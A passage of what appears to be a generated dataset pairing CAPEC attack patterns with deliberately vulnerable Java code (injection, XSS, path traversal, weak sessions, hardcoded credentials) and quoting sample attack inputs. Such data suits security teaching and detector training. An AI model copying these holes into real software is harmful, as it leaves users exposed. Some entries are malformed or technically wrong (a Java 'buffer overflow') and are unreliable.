        "code_snippet": "public class AuthenticationService {\n    private static final String SERVER_KEY = \"secret123\";\n\n    public boolean authenticateUser(String clientToken) {\n        // Client-side security check (vulnerable to bypass)\n        if (clientToken != null) {\n            // Simple client-side token validation\n            boolean isAuthenticated = clientToken.equals(SERVER_KEY);\n            \n            // Optimization may remove this check in release builds\n            if (isAuthenticated) {\n                return true;\n            }\n        }\n        return false;\n    }\n\n    public String processSecureRequest(String token, String request) {\n        // Relies solely on client-side validation\n        if (authenticateUser(token)) {\n            return \"Processed: \" + request;\n        }\n        return \"Unauthorized\";\n    }\n}",
        "description": "This code demonstrates multiple authentication vulnerabilities including client-side security enforcement, capture-replay vulnerability, and compiler optimization issues. The authentication relies on a simple token comparison that can be easily intercepted and replayed. The security checks are implemented on the client side and can be bypassed. Additionally, the authentication logic might be affected by compiler optimizations in release builds."
    },
    {
        "capec_id": "57",
        "capec_name": "Utilizing REST's Trust in the System Resource to Obtain Sensitive Data",
        "code_snippet": "public class RestApiController {\n    @GetMapping(\"/api/user/details\")\n    public UserDetails getUserDetails(@RequestParam String userId, @RequestParam String ssn) {\n        // No authentication check performed\n        // Sensitive data passed in query parameters\n        UserDetails details = userService.fetchUserDetails(userId);\n        \n        // State data stored in public cache\n        publicCache.put(userId, details);\n        \n        // SSL termination at load balancer, but no additional verification\n        return details;\n    }\n    \n    @GetMapping(\"/api/transaction\")\n    public TransactionResponse processTransaction(\n            @RequestParam String accountNumber,\n            @RequestParam String amount) {\n        // Sensitive data in GET request\n        // No channel verification\n        return transactionService.process(accountNumber, amount);\n    }\n}",
        "description": "This vulnerable code demonstrates REST API endpoints that expose sensitive data through GET requests, lack proper authentication, and store critical state data in accessible locations. It assumes SSL termination without additional security measures, allowing potential attackers to intercept sensitive information passed through query parameters."
    },
    {
        "capec_id": "58",
        "capec_name": "Restful Privilege Elevation",
        "code_snippet": "public class BankTransferController {\n    @RestController\n    @RequestMapping(\"/api/transfers\")\n    public class TransferController {\n        @GetMapping(\"/execute/{fromAccount}/{toAccount}/{amount}\")\n        public ResponseEntity<String> executeTransfer(\n            @PathVariable String fromAccount,\n            @PathVariable String toAccount,\n            @PathVariable Double amount) {\n            \n            // No authentication or authorization check\n            performTransfer(fromAccount, toAccount, amount);\n            return ResponseEntity.ok(\"Transfer successful\");\n        }\n\n        @GetMapping(\"/deleteAccount/{accountId}\")\n        public ResponseEntity<String> deleteAccount(@PathVariable String accountId) {\n            // Sensitive operation exposed via GET\n            // No privilege check\n            deleteAccountFromSystem(accountId);\n            return ResponseEntity.ok(\"Account deleted\");\n        }\n\n        private void performTransfer(String from, String to, Double amount) {\n            // Transfer logic here\n        }\n\n        private void deleteAccountFromSystem(String accountId) {\n            // Deletion logic here\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates a REST API that improperly exposes sensitive operations through HTTP GET methods without any authentication or authorization checks. It allows state-changing operations (money transfers and account deletions) through GET requests, violating REST principles. The code lacks privilege verification and proper access control mechanisms, allowing any user to perform sensitive banking operations."
    },
    {
        "capec_id": "59",
        "capec_name": "Session Credential Falsification through Prediction",
        "code_snippet": "public class SessionManager {\n    private static int sessionCounter = 0;\n\n    public static String generateSessionId() {\n        sessionCounter++;\n        return \"SESSION_\" + sessionCounter;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        // Weak validation - only checks if session ID format matches\n        return sessionId != null && sessionId.startsWith(\"SESSION_\");\n    }\n\n    public static void setSessionCookie(HttpServletResponse response, String sessionId) {\n        Cookie cookie = new Cookie(\"sessionId\", sessionId);\n        cookie.setMaxAge(365 * 24 * 60 * 60); // Persistent cookie for 1 year\n        cookie.setSecure(false);\n        cookie.setHttpOnly(false);\n        response.addCookie(cookie);\n    }\n}",
        "description": "This vulnerable code demonstrates predictable session ID generation using a simple incremental counter. It lacks proper randomization, uses persistent cookies with sensitive data, performs weak session validation, and doesn't implement proper security controls. The session IDs are easily guessable, and the cookies are set without secure flags, making them susceptible to hijacking and spoofing attacks."
    },
    {
        "capec_id": "60",
        "capec_name": "Reusing Session IDs (aka Session Replay)",
        "code_snippet": "public class SessionManager {\n    private static Map<String, String> activeSessions = new HashMap<>();\n\n    public static String createSession(String username) {\n        String sessionId = generateSessionId();\n        activeSessions.put(sessionId, username);\n        return sessionId;\n    }\n\n    public static boolean validateSession(String sessionId) {\n        // Vulnerable: No session expiration or replay protection\n        return activeSessions.containsKey(sessionId);\n    }\n\n    public static void processUserRequest(HttpServletRequest request) {\n        String sessionId = request.getParameter(\"sessionId\");\n        if(validateSession(sessionId)) {\n            // Vulnerable: No additional authentication checks\n            String username = activeSessions.get(sessionId);\n            grantAccess(username);\n        }\n    }\n\n    private static String generateSessionId() {\n        // Vulnerable: Predictable session ID generation\n        return String.valueOf(System.currentTimeMillis());\n    }\n\n    private static void grantAccess(String username) {\n        // Grant system access based on session ID only\n    }\n}",
        "description": "This vulnerable code demonstrates session management flaws that enable session replay attacks. The code uses a simple map to store session IDs without implementing proper session expiration, validation, or replay protection mechanisms. It generates predictable session IDs, doesn't invalidate old sessions, and performs no additional authentication checks beyond the session ID verification. The code also lacks proper session boundaries and authorization controls, making it susceptible to session hijacking and replay attacks."
    },
    {
        "capec_id": "61",
        "capec_name": "Session Fixation",
        "code_snippet": "public class SessionManager {\n    private static Map<String, UserSession> sessions = new HashMap<>();\n\n    public static void login(String sessionId, String username, String password) {\n        // Accept client-provided session ID without validation\n        if (authenticateUser(username, password)) {\n            UserSession session = new UserSession(username, \"AUTHENTICATED\");\n            // Reuse existing session ID without regenerating\n            sessions.put(sessionId, session);\n        }\n    }\n\n    public static boolean isAuthenticated(String sessionId) {\n        UserSession session = sessions.get(sessionId);\n        return session != null && \"AUTHENTICATED\".equals(session.getStatus());\n    }\n\n    public static void processRequest(String sessionId, String action) {\n        if (isAuthenticated(sessionId)) {\n            // Process privileged action using the session ID\n            executeAction(action);\n        }\n    }\n\n    private static boolean authenticateUser(String username, String password) {\n        // Authentication logic here\n        return true;\n    }\n}",
        "description": "This vulnerable code demonstrates session fixation by allowing client-provided session IDs and not regenerating them after authentication. The code accepts any session identifier from the client, maintains it throughout the authentication process, and doesn't invalidate existing sessions. This allows an attacker to provide a known session ID to a victim, wait for them to authenticate, and then use the same session ID to gain unauthorized access to the authenticated session."
    },
    {
        "capec_id": "62",
        "capec_name": "Cross Site Request Forgery",
        "code_snippet": "@Controller\npublic class UserAccountController {\n    @Autowired\n    private UserService userService;\n\n    @PostMapping(\"/transfer\")\n    public String transferMoney(\n        @RequestParam(\"toAccount\") String toAccount,\n        @RequestParam(\"amount\") double amount,\n        HttpSession session\n    ) {\n        String userId = (String) session.getAttribute(\"userId\");\n        if (userId != null) {\n            userService.transferFunds(userId, toAccount, amount);\n            return \"success\";\n        }\n        return \"error\";\n    }\n\n    @PostMapping(\"/updateProfile\")\n    public String updateProfile(\n        @RequestParam(\"email\") String newEmail,\n        @CookieValue(\"sessionId\") String sessionId\n    ) {\n        if (sessionId != null) {\n            userService.updateEmail(sessionId, newEmail);\n            return \"profile_updated\";\n        }\n        return \"error\";\n    }\n}",
        "description": "This vulnerable code demonstrates a banking application's endpoints susceptible to CSRF attacks. The code lacks CSRF tokens and proper authentication checks. It relies solely on session cookies without SameSite attributes, making it vulnerable to cross-site requests. The money transfer and profile update functions don't verify the request's origin or authenticity, allowing attackers to craft malicious links that execute these actions using the victim's active session."
    },
    {
        "capec_id": "63",
        "capec_name": "Cross-Site Scripting (XSS)",
        "code_snippet": "public class CommentServlet extends HttpServlet {\n    @Override\n    protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String userComment = request.getParameter(\"comment\");\n        // Directly storing user input without sanitization\n        String htmlContent = \"<div class='comment'>\" + userComment + \"</div>\";\n        \n        // Store comment in database\n        Database db = Database.getInstance();\n        db.storeComment(htmlContent);\n        \n        // Display comments including the new one\n        PrintWriter out = response.getWriter();\n        out.println(\"<html><body>\");\n        out.println(\"<h2>Comments:</h2>\");\n        for(String comment : db.getAllComments()) {\n            // Directly writing stored HTML to response\n            out.println(comment);\n        }\n        out.println(\"</body></html>\");\n    }\n}",
        "description": "This vulnerable code demonstrates a typical XSS vulnerability where user input from a comment form is neither validated nor sanitized before being stored in the database and subsequently displayed to other users. The code directly embeds user input into HTML markup without escaping special characters, allowing attackers to inject malicious scripts that will be executed in other users' browsers."
    },
    {
        "capec_id": "64",
        "capec_name": "Using Slashes and URL Encoding Combined to Bypass Validation Logic",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    private static final String BASE_PATH = \"/secure/documents/\";\n    \n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // Vulnerable: Insufficient URL decoding and path validation\n        String decodedFileName = URLDecoder.decode(fileName, \"UTF-8\");\n        File file = new File(BASE_PATH + decodedFileName);\n        \n        if (file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            response.setContentType(\"application/octet-stream\");\n            IOUtils.copy(fis, response.getOutputStream());\n            fis.close();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable file access servlet that improperly handles URL encoding and path traversal. It accepts a URL-encoded filename parameter, decodes it once without properly validating the resulting path, and directly uses it to access files. An attacker can use double-encoded paths (like %252e%252e%2f for '../') or other encoding variations to bypass security checks and access files outside the intended directory."
    },
    {
        "capec_id": "65",
        "capec_name": "Sniff Application Code",
        "code_snippet": "public class ClientUpdater {\n    public void downloadAndInstallUpdate(String serverUrl) {\n        try {\n            URL url = new URL(\"http://\" + serverUrl + \"/updates/latest.jar\");\n            URLConnection conn = url.openConnection();\n            \n            byte[] updateBytes = new byte[1024];\n            InputStream in = conn.getInputStream();\n            FileOutputStream out = new FileOutputStream(\"update.jar\");\n            \n            int bytesRead;\n            while ((bytesRead = in.read(updateBytes)) != -1) {\n                out.write(updateBytes, 0, bytesRead);\n            }\n            \n            out.close();\n            in.close();\n            \n            // Load and execute the update without verification\n            URLClassLoader loader = new URLClassLoader(\n                new URL[]{new File(\"update.jar\").toURL()}\n            );\n            Class<?> updateClass = loader.loadClass(\"com.example.Update\");\n            updateClass.getDeclaredMethod(\"apply\").invoke(null);\n            \n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code downloads and executes a client update over an unencrypted HTTP connection without any integrity checks. It demonstrates multiple vulnerabilities: transmission of potentially sensitive code over cleartext (CWE-319), lack of encryption (CWE-311), no verification of the downloaded code's integrity (CWE-494), and failure to implement proper protection mechanisms (CWE-693). An attacker can intercept the update, modify it, or replace it with malicious code."
    },
    {
        "capec_id": "66",
        "capec_name": "SQL Injection",
        "code_snippet": "public class UserAuthentication {\n    private Connection conn;\n    \n    public boolean authenticateUser(String username, String password) {\n        Statement stmt = null;\n        ResultSet rs = null;\n        try {\n            String query = \"SELECT * FROM users WHERE username = '\" + username + \n                          \"' AND password = '\" + password + \"'\";\n            \n            stmt = conn.createStatement();\n            rs = stmt.executeQuery(query);\n            \n            if (rs.next()) {\n                System.out.println(\"Login successful for user: \" + username);\n                return true;\n            }\n        } catch (SQLException e) {\n            System.out.println(\"Database error: \" + e.getMessage());\n        } finally {\n            try {\n                if (rs != null) rs.close();\n                if (stmt != null) stmt.close();\n            } catch (SQLException e) {\n                e.printStackTrace();\n            }\n        }\n        return false;\n    }\n}",
        "description": "This code is vulnerable to SQL injection as it directly concatenates user input into the SQL query without sanitization. It also exposes sensitive information in error messages and doesn't properly manage database cursors. An attacker could bypass authentication by injecting malicious SQL code through the username or password parameters."
    },
    {
        "capec_id": "67",
        "capec_name": "String Format Overflow in syslog()",
        "code_snippet": "public class SyslogWrapper {\n    public static void logMessage(String userInput) {\n        // Insecure syslog implementation using user input directly as format string\n        Syslog syslog = new Syslog();\n        String message = userInput;\n        \n        // Vulnerable: userInput is used directly as format string\n        syslog.syslog(Syslog.LOG_WARNING, message);\n        \n        // Vulnerable: No size checking on buffer\n        char[] buffer = new char[64];\n        message.getChars(0, message.length(), buffer, 0);\n        \n        // Format string vulnerability combined with buffer overflow\n        String formattedMessage = String.format(message, buffer);\n        syslog.syslog(Syslog.LOG_WARNING, formattedMessage);\n    }\n}",
        "description": "This code demonstrates an unsafe implementation of syslog logging where user input is directly used as a format string parameter without validation or sanitization. The code is vulnerable to both format string injection and buffer overflow attacks, as it doesn't validate input length or properly escape format specifiers."
    },
    {
        "capec_id": "68",
        "capec_name": "Subvert Code-signing Facilities",
        "code_snippet": "public class WeakCodeSigner {\n    private static final String WEAK_HASH = \"MD5\";\n    \n    public static byte[] signCode(byte[] code, PrivateKey privateKey) {\n        try {\n            // Using weak hash algorithm\n            MessageDigest md = MessageDigest.getInstance(WEAK_HASH);\n            byte[] hash = md.digest(code);\n            \n            // Missing verification step\n            Signature signature = Signature.getInstance(\"MD5withRSA\");\n            signature.initSign(privateKey);\n            signature.update(hash);\n            \n            // Optimization might remove security checks\n            if (System.currentTimeMillis() % 2 == 0) {\n                return signature.sign();\n            } else {\n                // Bypass signature verification\n                return hash;\n            }\n        } catch (Exception e) {\n            return null;\n        }\n    }\n    \n    public static boolean verifySignature(byte[] code, byte[] signature, PublicKey publicKey) {\n        // Weak verification that can be bypassed\n        return true;\n    }\n}",
        "description": "This code demonstrates vulnerable code signing implementation using multiple weaknesses: it uses MD5 (weak hash algorithm), missing critical verification steps, contains a potential optimization bypass, and implements a verification method that always returns true, effectively bypassing signature checks. This allows for execution of unsigned or maliciously signed code."
    },
    {
        "capec_id": "69",
        "capec_name": "Target Programs with Elevated Privileges",
        "code_snippet": "public class SystemUpdater {\n    static {\n        System.loadLibrary(\"native_helper\");\n    }\n\n    private static final String UPDATE_SCRIPT = \"/usr/local/bin/update.sh\";\n\n    public static void performSystemUpdate(String userInput) {\n        try {\n            // Runs with elevated privileges\n            Runtime.getRuntime().exec(\"sudo \" + UPDATE_SCRIPT + \" \" + userInput);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void main(String[] args) {\n        if (args.length > 0) {\n            performSystemUpdate(args[0]);\n        }\n    }\n}",
        "description": "This vulnerable code runs with unnecessary elevated privileges (sudo) and directly executes OS commands with unvalidated user input. It also loads an external library without verification and performs system operations without proper input sanitization, making it susceptible to command injection and privilege escalation attacks."
    },
    {
        "capec_id": "70",
        "capec_name": "Try Common or Default Usernames and Passwords",
        "code_snippet": "public class UserAuthentication {\n    private static final String DEFAULT_ADMIN_USER = \"admin\";\n    private static final String DEFAULT_ADMIN_PASS = \"admin123\";\n    \n    public boolean authenticateUser(String username, String password) {\n        if (username == null || password == null) {\n            return false;\n        }\n        \n        // Using hardcoded credentials for admin\n        if (username.equals(DEFAULT_ADMIN_USER) && \n            password.equals(DEFAULT_ADMIN_PASS)) {\n            return true;\n        }\n        \n        // Simple password check without any complexity requirements\n        if (username.equals(\"user\") && \n            (password.equals(\"password\") || \n             password.equals(\"123456\") || \n             password.equals(\"\"))) {\n            return true;\n        }\n        \n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple authentication weaknesses including hardcoded default credentials, acceptance of common/weak passwords, single-factor authentication, and no password aging mechanism. The authentication system accepts empty passwords and common password combinations, making it susceptible to password guessing attacks."
    },
    {
        "capec_id": "71",
        "capec_name": "Using Unicode Encoding to Bypass Validation Logic",
        "code_snippet": "public class UnicodeFilter {\n    private static final String[] BLOCKED_CHARS = {\"<\", \">\", \"&\", \"'\"};\n\n    public static String filterInput(String input) {\n        // Validate before canonicalization (CWE-180)\n        for (String blocked : BLOCKED_CHARS) {\n            if (input.contains(blocked)) {\n                return \"\";\n            }\n        }\n\n        // Decode after validation, allowing bypass\n        String decoded = java.net.URLDecoder.decode(input, \"UTF-8\");\n\n        // Incomplete validation of Unicode characters\n        if (!decoded.matches(\"[\\\\p{ASCII}]+\")) {\n            // Only checks for non-ASCII but misses specific Unicode variants\n            return decoded;\n        }\n\n        return decoded;\n    }\n\n    public static void processUserInput(String userInput) {\n        String filtered = filterInput(userInput);\n        // Dangerous: passes potentially harmful Unicode to downstream component\n        executeCommand(\"cmd /c \" + filtered);\n    }\n\n    private static void executeCommand(String cmd) {\n        try {\n            Runtime.getRuntime().exec(cmd);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of Unicode encoding by validating input before decoding and using an incomplete blocklist. It fails to properly handle alternate encodings and Unicode variants, allowing attackers to bypass security filters through Unicode-based encoding tricks. The code validates input before canonicalization and uses an incomplete list of disallowed inputs, making it susceptible to injection attacks through Unicode characters."
    },
    {
        "capec_id": "72",
        "capec_name": "URL Encoding",
        "code_snippet": "public class URLFileAccess {\n    public void readFileFromURL(HttpServletRequest request) {\n        String filePath = request.getParameter(\"file\");\n        try {\n            File file = new File(filePath);\n            FileInputStream fis = new FileInputStream(file);\n            byte[] data = new byte[(int) file.length()];\n            fis.read(data);\n            fis.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void downloadFromURL(String urlInput) {\n        try {\n            URL url = new URL(urlInput);\n            URLConnection conn = url.openConnection();\n            InputStream is = conn.getInputStream();\n            // Process stream without validation\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of URL encoding and file paths. It accepts user input for file paths without proper validation or encoding checks, allowing potential path traversal and URL encoding manipulation. The code directly uses raw input in file system operations and URL connections without sanitizing or validating the input, making it susceptible to various injection attacks and encoding-based exploits."
    },
    {
        "capec_id": "73",
        "capec_name": "User-Controlled Filename",
        "code_snippet": "public class FileHandler {\n    private static final String UPLOAD_DIR = \"/uploads/\";\n\n    public String saveUserFile(String fileName, byte[] content) {\n        // No validation of fileName\n        String filePath = UPLOAD_DIR + fileName;\n        try {\n            FileOutputStream fos = new FileOutputStream(filePath);\n            fos.write(content);\n            fos.close();\n            \n            // Generates HTML link without encoding\n            return \"<a href='\" + filePath + \"'>Download \" + fileName + \"</a>\";\n        } catch (IOException e) {\n            return \"Error saving file\";\n        }\n    }\n\n    public String displayFileContent(String fileName) {\n        try {\n            String content = new String(Files.readAllBytes(\n                Paths.get(UPLOAD_DIR + fileName)));\n            // Directly embedding user input into HTML\n            return \"<div>\" + content + \"</div>\";\n        } catch (IOException e) {\n            return \"Error reading file\";\n        }\n    }\n}",
        "description": "This vulnerable code allows file upload and display without proper input validation or output encoding. It accepts any filename without sanitization, potentially allowing XSS through malicious filenames (e.g., 'xss.html><script>alert(1)</script>'). The code directly concatenates user input into HTML output without encoding, enabling stored XSS attacks through both the filename and file content."
    },
    {
        "capec_id": "74",
        "capec_name": "Manipulating State",
        "code_snippet": "public class UserStateManager {\n    private static boolean isAdmin = false;\n    private static String sessionState = \"\";\n    \n    public static void setState(String newState) {\n        sessionState = newState;\n    }\n    \n    public static void saveCookie(HttpServletResponse response, String userData) {\n        Cookie cookie = new Cookie(\"userState\", userData);\n        response.addCookie(cookie);\n    }\n    \n    public static void processStateTransition(String action) {\n        if(action.equals(\"elevate\")) {\n            if(sessionState.contains(\"authenticated\")) {\n                isAdmin = true;\n            }\n        }\n    }\n    \n    public static boolean performSecureOperation() {\n        // No state validation or integrity checks\n        if(sessionState != null) {\n            return isAdmin;\n        }\n        return false;\n    }\n}",
        "description": "This vulnerable code demonstrates multiple state management issues. It stores sensitive state information without proper protection, lacks state validation, uses cleartext cookies, and has no integrity checks. The state transitions can be manipulated as there's no proper verification of the previous state before transitioning to a new one, potentially allowing privilege escalation. The code also fails to properly initialize security-critical state variables and lacks proper protection mechanisms against state manipulation attacks."
    },
    {
        "capec_id": "75",
        "capec_name": "Manipulating Writeable Configuration Files",
        "code_snippet": "public class FileProcessor {\n    private String repoPath;\n\n    public FileProcessor(String repoPath) {\n        this.repoPath = repoPath;\n    }    \n\n    public void updateConfigFile(String fileName, String content, String checksum) {\n        try {\n            String filePath = repoPath + fileName;\n            \n            // Directly use external input without validation\n            Runtime rt = Runtime.getRuntime();\n            rt.exec(\"git checkout \" + fileName);\n            \n            // Write content without verifying source or integrity\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(content);\n            writer.close();\n            \n            // Update repository without authentication\n            rt.exec(\"git add \" + fileName);\n            rt.exec(\"git commit -m 'Updated configuration'\");\n            rt.exec(\"git push\");\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code represents a file processing system that handles configuration updates in a version control system. It demonstrates multiple vulnerabilities including command injection (through unchecked fileName parameter), lack of input validation, missing integrity checks (ignoring the checksum parameter), and no origin validation for the incoming content. The code directly processes and commits files to a repository without proper authentication or verification."
    },
    {
        "capec_id": "76",
        "capec_name": "Manipulating Web Input to File System Calls",
        "code_snippet": "public class FileManager {\n    public void accessUserFile(String userInput) {\n        String basePath = \"/home/users/\";\n        String filePath = basePath + userInput;\n        \n        try {\n            File file = new File(filePath);\n            if(file.exists()) {\n                FileInputStream fis = new FileInputStream(file);\n                // Process file contents\n                Runtime.getRuntime().exec(\"cat \" + filePath);\n                \n                // Change file permissions\n                String chmod = \"chmod 777 \" + filePath;\n                Runtime.getRuntime().exec(chmod);\n            }\n        } catch(Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates path traversal and command injection vulnerabilities. It accepts unchecked user input to construct file paths and execute system commands. An attacker could use '../' sequences to traverse directories outside the intended base path, or inject malicious commands through the file path parameter. The code also exhibits least privilege violations by using dangerous file permissions and lacks proper input validation."
    },
    {
        "capec_id": "77",
        "capec_name": "Manipulating User-Controlled Variables",
        "code_snippet": "public class ConfigurationManager {\n    private static Map<String, String> configuration = new HashMap<>();\n\n    static {\n        configuration.put(\"DEBUG\", \"false\");\n        configuration.put(\"ADMIN_ROLE\", \"false\");\n    }\n\n    public static void updateConfig(HttpServletRequest request) {\n        Enumeration<String> params = request.getParameterNames();\n        while (params.hasMoreElements()) {\n            String param = params.nextElement();\n            configuration.put(param, request.getParameter(param));\n        }\n    }\n\n    public static boolean isAdmin() {\n        return Boolean.parseBoolean(configuration.get(\"ADMIN_ROLE\"));\n    }\n\n    public static void executeCommand(String command) {\n        if(Boolean.parseBoolean(configuration.get(\"DEBUG\"))) {\n            Runtime.getRuntime().exec(command);\n        }\n    }\n}",
        "description": "This vulnerable code allows direct manipulation of system configuration through HTTP parameters without any validation. An attacker can override critical settings like DEBUG and ADMIN_ROLE flags through request parameters, potentially gaining unauthorized access or executing arbitrary commands. The code doesn't implement any authentication or validation checks before updating configuration values."
    },
    {
        "capec_id": "78",
        "capec_name": "Using Escaped Slashes in Alternate Encoding",
        "code_snippet": "public class FileValidator {\n    public static boolean isValidFilePath(String userInput) {\n        // Incorrect validation before canonicalization\n        if (!userInput.contains(\"../\")) {\n            String normalized = userInput.replace(\"\\\\\", \"/\");\n            String filePath = \"/home/user/files/\" + normalized;\n            File file = new File(filePath);\n            return file.exists();\n        }\n        return false;\n    }\n\n    public static void accessFile(String input) {\n        if(isValidFilePath(input)) {\n            // Potential path traversal due to backslash encoding\n            // Input like \"..\\/..\\/etc/passwd\" can bypass validation\n            try {\n                FileInputStream fis = new FileInputStream(\"/home/user/files/\" + input);\n                // Process file...\n            } catch(IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates improper handling of backslash encoding in file paths. The validation occurs before canonicalization and fails to properly handle alternate path encodings. An attacker can use backslashes to encode directory traversal sequences that bypass the validation but are later interpreted as valid path components, potentially allowing access to files outside the intended directory."
    },
    {
        "capec_id": "79",
        "capec_name": "Using Slashes in Alternate Encoding",
        "code_snippet": "public class FileAccessServlet extends HttpServlet {\n    private static final String BASE_PATH = \"/var/www/files/\";\n\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String fileName = request.getParameter(\"file\");\n        \n        // Vulnerable validation: only checks for forward slashes\n        if(fileName.contains(\"/\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN);\n            return;\n        }\n\n        // Doesn't handle backslash characters, allowing path traversal\n        File file = new File(BASE_PATH + fileName);\n        \n        if(file.exists()) {\n            FileInputStream fis = new FileInputStream(file);\n            OutputStream os = response.getOutputStream();\n            byte[] buffer = new byte[4096];\n            int length;\n            while ((length = fis.read(buffer)) > 0) {\n                os.write(buffer, 0, length);\n            }\n            fis.close();\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable file access servlet that fails to properly handle alternate path encodings. It only checks for forward slashes but ignores backslashes, allowing path traversal attacks. An attacker could use backslashes (e.g., '..\\..\\sensitive.txt') to access files outside the intended directory. The code also lacks proper input canonicalization and performs validation before normalization, making it susceptible to various encoding-based attacks."
    },
    {
        "capec_id": "80",
        "capec_name": "Using UTF-8 Encoding to Bypass Validation Logic",
        "code_snippet": "public class FileHandler {\n    public static void saveUserInput(String userInput) {\n        try {\n            // Vulnerable validation - checks before decoding\n            if (!userInput.contains(\"../\") && !userInput.contains(\"../\")) {\n                // Decode UTF-8 input after validation\n                String decodedInput = java.net.URLDecoder.decode(userInput, \"UTF-8\");\n                \n                // Create file with decoded input\n                String fileName = \"user_files/\" + decodedInput;\n                java.io.FileWriter writer = new java.io.FileWriter(fileName);\n                writer.write(decodedInput);\n                writer.close();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code accepts user input and performs validation before decoding UTF-8 content, allowing attackers to bypass security checks using alternate UTF-8 encodings. The code fails to properly validate file paths after decoding, enabling directory traversal attacks through encoded characters. It also demonstrates improper input validation order (validate-before-decode) and unsafe file operations with user-controlled data."
    },
    {
        "capec_id": "81",
        "capec_name": "Web Server Logs Tampering",
        "code_snippet": "public class WebLogger {\n    private static final String LOG_FILE = \"/var/log/webapp.log\";\n    \n    public void logUserAction(String username, String action) {\n        try {\n            String logEntry = username + \" - \" + action + \"\\n\";\n            FileWriter writer = new FileWriter(LOG_FILE, true);\n            writer.write(logEntry);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n    \n    public void logRequest(HttpServletRequest request) {\n        String userInput = request.getParameter(\"data\");\n        String ipAddress = request.getRemoteAddr();\n        String logMessage = ipAddress + \": \" + userInput;\n        try {\n            FileWriter writer = new FileWriter(LOG_FILE, true);\n            writer.write(logMessage);\n            writer.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This vulnerable code demonstrates web log tampering vulnerabilities. The logger directly writes user input to log files without any sanitization, allowing injection of CRLF sequences and special characters. It also uses default file permissions and doesn't properly encode output. Attackers can inject malicious entries, forge log records, or manipulate the log structure to hide malicious activities."
    },
    {
        "capec_id": "82",
        "capec_name": "DEPRECATED: Violating Implicit Assumptions Regarding XML Content (aka XML Denial of Service (XDoS))",
        "code_snippet": "\"\"\"\n    import javax.xml.parsers.DocumentBuilder;\n    import javax.xml.parsers.DocumentBuilderFactory;\n    \n    public class XMLProcessor {\n        public void processXML(String xmlInput) {\n            try {\n                DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n                // Missing XML validation against schema\n                // Missing external entity restriction\n                DocumentBuilder builder = factory.newDocumentBuilder();\n                \n                // Direct processing of untrusted XML without sanitization\n                org.w3c.dom.Document doc = builder.parse(new java.io.ByteArrayInputStream(\n                    xmlInput.getBytes(\"UTF-8\")));\n                \n                // Process and store the XML content without validation\n                String content = doc.getElementsByTagName(\"data\").item(0).getTextContent();\n                saveToDatabase(content);",
        "description": "\"This vulnerable code demonstrates multiple XML-related security issues: it lacks proper XML validation against a schema (CWE-112), doesn't protect against XML injection (CWE-91), fails to restrict XML external entity references (CWE-611), and doesn't limit recursive entity expansions (CWE-776). The code processes XML input directly without proper validation or sanitization, making it susceptible to various XML-based attacks including oversized payloads, nested payloads, and XXE attacks.\""
    },
    {
        "capec_id": "83",
        "capec_name": "XPath Injection",
        "code_snippet": "public class UserAuthenticator {\n    public boolean authenticateUser(String username, String password) {\n        String xmlDocument = \"<?xml version='1.0' encoding='UTF-8'?>\"\n            + \"<users>\"\n            + \"<user><username>admin</username><password>admin123</password></user>\"\n            + \"<user><username>user1</username><password>pass123</password></user>\"\n            + \"</users>\";\n        \n        try {\n            DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\n            DocumentBuilder builder = factory.newDocumentBuilder();\n            Document doc = builder.parse(new InputSource(new StringReader(xmlDocument)));\n            \n            // Vulnerable XPath query construction without input validation\n            String xpathQuery = \"//user[username='\" + username + \"' and password='\" + password + \"']\";\n            XPath xpath = XPathFactory.newInstance().newXPath();\n            NodeList nodes = (NodeList) xpath.evaluate(xpathQuery, doc, XPathConstants.NODESET);\n            \n            return nodes.getLength() > 0;\n        } catch (Exception e) {\n            return false;\n        }\n    }\n}",
        "description": "This code demonstrates a vulnerable XML authentication system using XPath queries. The code directly embeds user input into an XPath expression without proper sanitization or parameterization, making it vulnerable to XPath injection attacks. An attacker could input specially crafted values for username or password to manipulate the query and bypass authentication, such as ' or '1'='1."
    },
    {
        "capec_id": "84",
        "capec_name": "XQuery Injection",
        "code_snippet": "public class XQueryHandler {\n    public String getCustomerData(String customerInput) {\n        try {\n            String xquery = \"for $customer in doc('customers.xml')/customers/customer\"\n                    + \" where $customer/id = '\" + customerInput + \"'\"\n                    + \" return $customer/name/text()\";\n            \n            XQDataSource ds = new SaxonXQDataSource();\n            XQConnection conn = ds.getConnection();\n            XQPreparedExpression expr = conn.prepareExpression(xquery);\n            XQResultSequence result = expr.executeQuery();\n            \n            return result.getSequenceAsString(null);\n        } catch (XQException e) {\n            return \"Error processing query\";\n        }\n    }\n}",
